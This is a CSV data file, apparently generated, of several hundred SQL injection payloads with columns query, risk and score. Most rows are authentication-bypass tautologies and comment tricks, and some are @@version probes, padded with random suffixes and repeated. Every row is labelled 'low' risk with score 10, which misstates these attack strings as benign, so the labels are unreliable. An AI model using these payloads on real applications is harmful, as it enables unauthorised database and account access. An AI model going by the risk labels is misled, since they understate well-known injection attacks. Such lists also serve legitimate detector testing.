query,risk,score
' or 'a'='a /**/ # kd,low,10
1' OR '1'='1 /**/ -- a,low,10
admin' /**/ /**/ /**/,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
' or 'a'='a AND 1=1 -- ,low,10
' || 1=1 -- # z11fwfq,low,10
admin' /**/ LIMIT 1 -- ,low,10
1' or 1=1 -- OR 1=1 # ,low,10
' OR 1=1 -- # 68z69c1,low,10
1' or true -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' || 1=1 -- OR 1=1 # ,low,10
1' or 1=1 -- # ehesv61,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- # mf646tc,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' or 'a'='a OR 1=1 # ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
1' or 1=1 -- # uddh8ut,low,10
' OR 1=1 LIMIT 1 -- # v5ns4dx,low,10
' or 'a'='a AND 1=1 -- ,low,10
admin' -- OR 1=1 # ,low,10
' or 'a'='a OR 1=1 # ,low,10
admin' -- OR 1=1 # ,low,10
' || 1=1 -- # nconyql,low,10
admin' -- # sq01vnf,low,10
admin' -- # fbxn7ha,low,10
' OR 'x'='x OR 1=1 # ,low,10
admin' /**/ # ps1pt86,low,10
' or 'a'='a -- 73t1rx,low,10
admin' /**/ /**/ # dp,low,10
admin' /**/ LIMIT 1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
1' or 1=1 -- -- hj8gjx,low,10
' OR 1 IN (SELECT @@version) -- /**/ # 45,low,10
' OR 'x'='x OR 1=1 # ,low,10
' or 'a'='a /**/ # pw,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # 4lpyc5l,low,10
' || 1=1 -- /**/ /**/,low,10
admin' -- LIMIT 1 -- ,low,10
' OR 'x'='x -- teunuf,low,10
' || 1=1 -- OR 1=1 # ,low,10
""" OR ""1""=""1 # 9ugmnkn",low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
admin' -- OR 1=1 # ,low,10
1' or true -- -- 43vd3m,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' -- # 4htx8bg,low,10
' or 'a'='a -- nzb0we,low,10
1' or 1=1 -- # 3c3dhkc,low,10
' OR 1=1 -- OR 1=1 # ,low,10
admin' -- -- 6ajcch,low,10
' OR 'x'='x AND 1=1 -- ,low,10
admin' -- LIMIT 1 -- ,low,10
1' or 1=1 -- -- 18yhjm,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
1' or '1'='1 OR 1=1 # ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
' OR 'x'='x /**/ /**/,low,10
' OR 'a'='a AND 1=1 -- ,low,10
' OR 1=1 -- /**/ -- 7,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' OR 1=1 -- # jzgkrbu,low,10
' OR 1 IN (SELECT @@version) -- # s9eu70y,low,10
admin' -- -- o4qwry,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
' or 'a'='a LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # et1xynz,low,10
' or 'a'='a LIMIT 1 -- ,low,10
1' or '1'='1 # j5v91kp,low,10
1' or 1=1 -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' OR 'x'='x # lngnx8r,low,10
' or 'a'='a LIMIT 1 -- ,low,10
' OR 'a'='a -- jzqhg1,low,10
' OR 1=1 LIMIT 1 -- -- o2l253,low,10
' || 1=1 -- /**/ # 80,low,10
1' or true -- OR 1=1 # ,low,10
admin' -- -- 5vq0fp,low,10
' OR 1=1 LIMIT 1 -- /**/ -- i,low,10
admin' -- LIMIT 1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
1' or '1'='1 OR 1=1 # ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' OR 1=1 LIMIT 1 -- # gg77aoe,low,10
' OR 1=1 -- -- 6vl1ro,low,10
1' or '1'='1 # b4ds4ws,low,10
' or 'a'='a OR 1=1 # ,low,10
' || 1=1 -- # vchh9us,low,10
' OR 1=1 -- /**/ # p1,low,10
' OR 1=1 -- -- 91cn43,low,10
admin' /**/ -- alm1h2,low,10
admin' -- /**/ -- e,low,10
1' or 1=1 -- -- qn07ui,low,10
' or 'a'='a LIMIT 1 -- ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
' OR 'x'='x AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
admin' /**/ LIMIT 1 -- ,low,10
' OR 'x'='x AND 1=1 -- ,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' OR 1=1 -- /**/ # rw,low,10
admin' /**/ LIMIT 1 -- ,low,10
' OR 1=1 -- -- 6npzsv,low,10
' || 1=1 -- # lqm9z6w,low,10
admin' -- LIMIT 1 -- ,low,10
1' or 1=1 -- # knjzrq4,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
admin' -- /**/ # s7,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' or 'a'='a /**/ # 7p,low,10
' OR 'a'='a /**/ -- 8,low,10
' OR 1=1 LIMIT 1 -- /**/ -- z,low,10
' OR 1=1 -- OR 1=1 # ,low,10
admin' /**/ -- m14ex8,low,10
' OR 1=1 LIMIT 1 -- -- ccxhbh,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- 17ju7l,low,10
1' OR '1'='1 -- 2xuk5j,low,10
' || 1=1 -- -- ikm6jr,low,10
1' or true -- OR 1=1 # ,low,10
1' or true -- AND 1=1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
' OR 'a'='a -- 4jwgn4,low,10
' OR 'x'='x OR 1=1 # ,low,10
' OR 'a'='a /**/ # an,low,10
' or 'a'='a /**/ -- 6,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
' OR 'a'='a /**/ # 5n,low,10
' or 'a'='a /**/ -- a,low,10
1' or true -- AND 1=1 -- ,low,10
' OR 'a'='a -- 482dzh,low,10
1' OR '1'='1 -- zkcxn8,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
' || 1=1 -- /**/ /**/,low,10
admin' /**/ # 7sm91wl,low,10
' || 1=1 -- -- mmrbnl,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
""" OR ""1""=""1 -- jsel36",low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' or 'a'='a /**/ # qk,low,10
1' or true -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
""" OR ""1""=""1 /**/ /**/",low,10
1' or true -- AND 1=1 -- ,low,10
1' OR '1'='1 # 1bng9tq,low,10
1' or true -- # 34wwaox,low,10
' OR 1=1 -- /**/ -- t,low,10
' OR 'x'='x AND 1=1 -- ,low,10
1' or true -- -- m184nu,low,10
' || 1=1 -- AND 1=1 -- ,low,10
admin' /**/ AND 1=1 -- ,low,10
1' OR '1'='1 -- 578fr0,low,10
' OR 1=1 LIMIT 1 -- -- ldihyw,low,10
1' or '1'='1 AND 1=1 -- ,low,10
' OR 1=1 -- -- 1hxqge,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' or 'a'='a OR 1=1 # ,low,10
1' or 1=1 -- # qwus2wf,low,10
' OR 'x'='x # 8rygkfl,low,10
' OR 1 IN (SELECT @@version) -- /**/ /**/,low,10
admin' /**/ OR 1=1 # ,low,10
admin' /**/ AND 1=1 -- ,low,10
1' or 1=1 -- # cn5hujx,low,10
' || 1=1 -- OR 1=1 # ,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
' || 1=1 -- # vx7y2kb,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
' || 1=1 -- /**/ /**/,low,10
' OR 'a'='a -- 4dtyb8,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' -- # z1po3ai,low,10
1' OR '1'='1 # l4he21v,low,10
' OR 1=1 LIMIT 1 -- # hglp5gt,low,10
admin' -- AND 1=1 -- ,low,10
1' or 1=1 -- # o6fzv8n,low,10
admin' -- OR 1=1 # ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
' || 1=1 -- /**/ # v3,low,10
1' or '1'='1 OR 1=1 # ,low,10
' OR 1=1 -- # gfck082,low,10
' OR 1=1 LIMIT 1 -- /**/ -- 2,low,10
1' OR '1'='1 -- vbzu2t,low,10
1' or 1=1 -- OR 1=1 # ,low,10
' || 1=1 -- /**/ /**/,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
admin' /**/ /**/ # 4o,low,10
1' or true -- OR 1=1 # ,low,10
admin' -- # ifzg4n6,low,10
admin' -- # 5jksmha,low,10
admin' -- -- tf6teh,low,10
1' or '1'='1 /**/ /**/,low,10
1' or 1=1 -- /**/ -- p,low,10
admin' -- # 94hhdcu,low,10
1' or true -- /**/ # rn,low,10
1' or 1=1 -- -- 4mog60,low,10
' OR 1=1 LIMIT 1 -- # r4m1cvc,low,10
""" OR ""1""=""1 # 683yjnd",low,10
admin' -- -- x3s6p9,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
1' or true -- /**/ -- g,low,10
admin' -- AND 1=1 -- ,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
1' or true -- /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- /**/ /**/,low,10
admin' -- -- hnnb2t,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
' OR 'x'='x # 3j8k7i3,low,10
admin' -- -- noe4bo,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
' or 'a'='a AND 1=1 -- ,low,10
admin' -- /**/ /**/,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
admin' -- /**/ /**/,low,10
1' or '1'='1 /**/ /**/,low,10
admin' -- LIMIT 1 -- ,low,10
admin' /**/ LIMIT 1 -- ,low,10
1' or 1=1 -- # gsctde0,low,10
""" OR ""1""=""1 -- 29i355",low,10
1' OR '1'='1 AND 1=1 -- ,low,10
' || 1=1 -- # m7qe2si,low,10
admin' -- # nhi4ib5,low,10
1' or '1'='1 /**/ -- r,low,10
admin' -- OR 1=1 # ,low,10
' OR 'x'='x # ohi2zey,low,10
' OR 'x'='x # f0l7l4d,low,10
' OR 1=1 -- /**/ /**/,low,10
' OR 1=1 -- -- 7tpbwg,low,10
1' or true -- AND 1=1 -- ,low,10
1' or true -- LIMIT 1 -- ,low,10
admin' /**/ /**/ -- f,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' /**/ # si3xw2h,low,10
' OR 1=1 -- /**/ /**/,low,10
' || 1=1 -- OR 1=1 # ,low,10
1' or 1=1 -- -- jvc1dk,low,10
' OR 'a'='a -- 9x0sr9,low,10
' || 1=1 -- -- hti3rg,low,10
' OR 1=1 LIMIT 1 -- # pakbi6p,low,10
' OR 'x'='x /**/ -- 2,low,10
' || 1=1 -- AND 1=1 -- ,low,10
1' or 1=1 -- # fpyjpmm,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' -- -- ab67pv,low,10
' OR 1=1 -- -- nnt4wv,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' or 'a'='a AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
admin' /**/ AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- obzkik,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
admin' -- OR 1=1 # ,low,10
' or 'a'='a AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
admin' -- # 5h96w7b,low,10
admin' -- -- r6cuuk,low,10
1' or true -- # pgcbya1,low,10
' OR 'a'='a /**/ /**/,low,10
' OR 'x'='x /**/ # s5,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
admin' -- /**/ -- u,low,10
' OR 1=1 LIMIT 1 -- /**/ # oy,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
admin' -- -- ce9q5t,low,10
' OR 'x'='x -- h8p7ym,low,10
1' or '1'='1 # i8fvm9j,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
admin' -- -- qezp3o,low,10
' OR 'x'='x -- a34d2y,low,10
' or 'a'='a -- 4hdrcg,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
' or 'a'='a LIMIT 1 -- ,low,10
admin' -- LIMIT 1 -- ,low,10
1' or true -- OR 1=1 # ,low,10
' OR 1=1 -- # h94o2ho,low,10
' OR 'a'='a -- zwx4y9,low,10
1' or '1'='1 /**/ /**/,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'a'='a /**/ /**/,low,10
1' or true -- LIMIT 1 -- ,low,10
' || 1=1 -- # abs8dv1,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' || 1=1 -- /**/ -- g,low,10
' || 1=1 -- AND 1=1 -- ,low,10
1' or true -- /**/ /**/,low,10
' or 'a'='a LIMIT 1 -- ,low,10
admin' -- /**/ # k9,low,10
1' or true -- AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- /**/ # 76,low,10
1' OR '1'='1 /**/ -- a,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' OR 1=1 -- OR 1=1 # ,low,10
""" OR ""1""=""1 -- b99hr4",low,10
admin' -- LIMIT 1 -- ,low,10
admin' -- # yzmriad,low,10
' OR 'a'='a AND 1=1 -- ,low,10
admin' -- -- hoax0o,low,10
1' or 1=1 -- /**/ -- d,low,10
' or 'a'='a -- c9rlfc,low,10
admin' /**/ AND 1=1 -- ,low,10
admin' /**/ OR 1=1 # ,low,10
admin' -- LIMIT 1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
admin' -- /**/ -- u,low,10
' || 1=1 -- /**/ -- k,low,10
' OR 1 IN (SELECT @@version) -- # ozasl2x,low,10
' OR 'a'='a /**/ # fo,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
admin' /**/ -- 4fct0s,low,10
1' or true -- -- dl2okm,low,10
' OR 'x'='x -- 5o8o9a,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
1' or true -- -- sg8m22,low,10
' || 1=1 -- -- 9h21ht,low,10
1' or '1'='1 AND 1=1 -- ,low,10
admin' -- # fogf321,low,10
1' or true -- OR 1=1 # ,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
1' OR '1'='1 # v5rdaq8,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
' || 1=1 -- OR 1=1 # ,low,10
admin' -- /**/ # st,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
' OR 'x'='x # 6uo552v,low,10
admin' /**/ /**/ # x8,low,10
' OR 'x'='x /**/ # 0f,low,10
admin' -- # owokjwj,low,10
admin' /**/ AND 1=1 -- ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
admin' -- # o0ohisc,low,10
' OR 1=1 LIMIT 1 -- -- nqej38,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
1' or true -- OR 1=1 # ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' or 'a'='a -- q54mlw,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
' OR 1=1 -- /**/ # hw,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
admin' -- -- fbijqz,low,10
' OR 1=1 -- OR 1=1 # ,low,10
admin' -- # q0hvot0,low,10
' OR 'a'='a AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- sfk1yc,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
admin' -- # u1t0blr,low,10
' OR 1=1 LIMIT 1 -- /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- -- on095w,low,10
' or 'a'='a LIMIT 1 -- ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' or 1=1 -- /**/ # ls,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'a'='a /**/ -- l,low,10
' OR 'x'='x OR 1=1 # ,low,10
' OR 'x'='x -- zu68wg,low,10
' or 'a'='a AND 1=1 -- ,low,10
' OR 'x'='x /**/ -- 8,low,10
' or 'a'='a AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- 8ot8dg,low,10
' OR 'a'='a /**/ /**/,low,10
admin' -- -- o8la2l,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
' OR 'x'='x OR 1=1 # ,low,10
' OR 'x'='x /**/ -- x,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
""" OR ""1""=""1 -- y9fxdf",low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
' OR 'a'='a /**/ # oq,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ckfg2t,low,10
' OR 'a'='a AND 1=1 -- ,low,10
admin' -- -- sh90pk,low,10
1' or '1'='1 -- n9168i,low,10
' OR 'x'='x -- ksal06,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
1' OR '1'='1 -- rwwuha,low,10
1' or 1=1 -- # gik13sx,low,10
1' or '1'='1 # 8eg3y1l,low,10
1' or true -- -- 1yytsl,low,10
' OR 1=1 LIMIT 1 -- -- 2o7omy,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' || 1=1 -- -- rvb7xv,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
admin' /**/ LIMIT 1 -- ,low,10
1' or true -- # nbwarm0,low,10
' OR 'x'='x AND 1=1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' -- /**/ # ca,low,10
1' or 1=1 -- -- tw4pg5,low,10
' or 'a'='a LIMIT 1 -- ,low,10
""" OR ""1""=""1 # ett044t",low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
' OR 1=1 LIMIT 1 -- -- n5g8w1,low,10
admin' -- -- xbdct0,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
1' or '1'='1 # z15k6yg,low,10
' || 1=1 -- -- e1lb87,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 /**/ # p5,low,10
' OR 'x'='x AND 1=1 -- ,low,10
1' or 1=1 -- -- dwyus5,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
""" OR ""1""=""1 # m25tpvo",low,10
1' or '1'='1 OR 1=1 # ,low,10
1' or true -- /**/ -- 1,low,10
' OR 'a'='a OR 1=1 # ,low,10
' OR 'a'='a OR 1=1 # ,low,10
' or 'a'='a /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- /**/ /**/,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
1' or 1=1 -- # uelya3g,low,10
admin' -- # 80q9jty,low,10
' or 'a'='a -- ear2en,low,10
1' or true -- # lfb6xqb,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
' OR 'a'='a OR 1=1 # ,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
1' or 1=1 -- -- hxqlf7,low,10
' OR 1=1 -- /**/ # m1,low,10
' OR 'x'='x /**/ -- 9,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ah,low,10
' OR 1=1 -- /**/ -- 3,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 -- vvcyss,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' or 'a'='a LIMIT 1 -- ,low,10
admin' /**/ AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
""" OR ""1""=""1 -- zsmbj6",low,10
1' or 1=1 -- /**/ -- t,low,10
1' or true -- -- sqdzx6,low,10
""" OR ""1""=""1 # 8kdta2e",low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
' || 1=1 -- -- 0jk686,low,10
' OR 'x'='x -- j6zz07,low,10
admin' -- /**/ /**/,low,10
' OR 'x'='x AND 1=1 -- ,low,10
' || 1=1 -- # o7yrwer,low,10
' OR 'a'='a -- vtao70,low,10
admin' -- OR 1=1 # ,low,10
admin' -- /**/ # r3,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' OR '1'='1 # oeefzgm,low,10
' OR 1=1 LIMIT 1 -- -- ul2nms,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
' OR 1=1 -- -- mysy5a,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' -- /**/ # 10,low,10
1' or true -- OR 1=1 # ,low,10
' || 1=1 -- -- kcf6nz,low,10
admin' -- /**/ # sy,low,10
' or 'a'='a -- v878zc,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'x'='x /**/ # wu,low,10
1' or '1'='1 # e4r635b,low,10
1' or '1'='1 # 2vtmp6o,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
admin' /**/ LIMIT 1 -- ,low,10
1' or 1=1 -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
admin' /**/ AND 1=1 -- ,low,10
' OR 1=1 -- # 3xg81pj,low,10
1' OR '1'='1 # q43a0cs,low,10
' OR 'a'='a -- sli00w,low,10
admin' -- LIMIT 1 -- ,low,10
1' or true -- # nbupzsj,low,10
admin' -- -- 6mi6dy,low,10
' || 1=1 -- /**/ /**/,low,10
' OR 'a'='a -- b3itn0,low,10
' || 1=1 -- /**/ # rd,low,10
admin' -- /**/ /**/,low,10
' || 1=1 -- # 6hkg0ek,low,10
' or 'a'='a LIMIT 1 -- ,low,10
1' OR '1'='1 /**/ /**/,low,10
' OR 'x'='x OR 1=1 # ,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
admin' /**/ /**/ # h3,low,10
admin' -- /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 1=1 -- /**/ -- 8,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
admin' /**/ OR 1=1 # ,low,10
1' or 1=1 -- # 7zkqqq9,low,10
' OR 'x'='x OR 1=1 # ,low,10
admin' -- /**/ /**/,low,10
1' or 1=1 -- # s9g8gtf,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' or 'a'='a # 5xzlo2n,low,10
' OR 'x'='x -- rxogkf,low,10
admin' -- # nuefckq,low,10
admin' -- -- zo202e,low,10
admin' -- # 9teg4yd,low,10
' OR 'x'='x -- 4cm049,low,10
1' or true -- OR 1=1 # ,low,10
' or 'a'='a AND 1=1 -- ,low,10
admin' -- # 91tahmk,low,10
' OR 'x'='x /**/ /**/,low,10
1' OR '1'='1 # eiw54ah,low,10
' or 'a'='a -- y0awjg,low,10
' OR 1=1 -- /**/ -- e,low,10
' || 1=1 -- OR 1=1 # ,low,10
1' or true -- /**/ /**/,low,10
admin' -- # 8snaulz,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
' OR 1=1 -- -- 4g5fzj,low,10
' OR 'x'='x -- ny7gri,low,10
' OR 'a'='a OR 1=1 # ,low,10
1' or 1=1 -- OR 1=1 # ,low,10
""" OR ""1""=""1 # m4atw0f",low,10
' OR 'x'='x # d04m87a,low,10
' || 1=1 -- # r3lom8h,low,10
1' or 1=1 -- -- uxcyq0,low,10
1' OR '1'='1 /**/ /**/,low,10
' or 'a'='a # 4i8skaq,low,10
' OR 'a'='a -- b44hbl,low,10
admin' -- # 33wvyni,low,10
' OR 'x'='x AND 1=1 -- ,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
admin' /**/ # uyiwfos,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
1' OR '1'='1 # zx3snl1,low,10
' OR 1 IN (SELECT @@version) -- -- dw5tv0,low,10
' OR 'a'='a AND 1=1 -- ,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' || 1=1 -- # k4ulqrq,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
1' OR '1'='1 # 8eb70em,low,10
admin' -- # 04rvsrc,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
' or 'a'='a OR 1=1 # ,low,10
admin' -- # bkrojtd,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
' || 1=1 -- # y9jtqtu,low,10
' OR 1=1 LIMIT 1 -- # 63z96fb,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' /**/ -- lwj5ho,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' or 'a'='a /**/ # 82,low,10
1' or '1'='1 OR 1=1 # ,low,10
1' or true -- # kxfmszd,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
1' or 1=1 -- -- ochf72,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
1' OR '1'='1 # qutpjpo,low,10
' OR 'x'='x -- 6qm50l,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 'a'='a # pxbpg6z,low,10
' OR 1 IN (SELECT @@version) -- -- ujt568,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
1' or true -- # gmjb26l,low,10
' OR 'a'='a /**/ -- f,low,10
' || 1=1 -- -- g9hc1r,low,10
